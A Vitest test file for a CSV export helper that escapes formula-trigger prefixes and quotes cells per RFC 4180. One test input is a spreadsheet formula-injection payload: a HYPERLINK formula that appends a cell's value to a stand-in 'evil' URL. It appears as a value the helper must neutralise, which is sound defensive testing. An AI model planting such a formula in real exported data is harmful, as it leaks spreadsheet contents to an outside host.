import { describe, it, expect } from "vitest";
import { csvCell } from "./csv";

describe("csvCell — formula-injection safe CSV export (PBA-L3c-022)", () => {
  it("neutralises every formula-trigger prefix", () => {
    expect(csvCell('=HYPERLINK("https://evil/?"&A1,"x")')).toBe(`"'=HYPERLINK(""https://evil/?""&A1,""x"")"`);
    expect(csvCell("+1+1")).toBe("'+1+1");
    expect(csvCell("-2+3")).toBe("'-2+3");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell("\t=1")).toBe("'\t=1");
    expect(csvCell("\r=1")).toBe(`"'\r=1"`);
  });
  it("leaves ordinary values alone and still quotes per RFC 4180", () => {
    expect(csvCell("Acme Corp")).toBe("Acme Corp");
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("line1\nline2")).toBe('"line1\nline2"');
    expect(csvCell("")).toBe("");
    expect(csvCell("x=1")).toBe("x=1");
  });
});
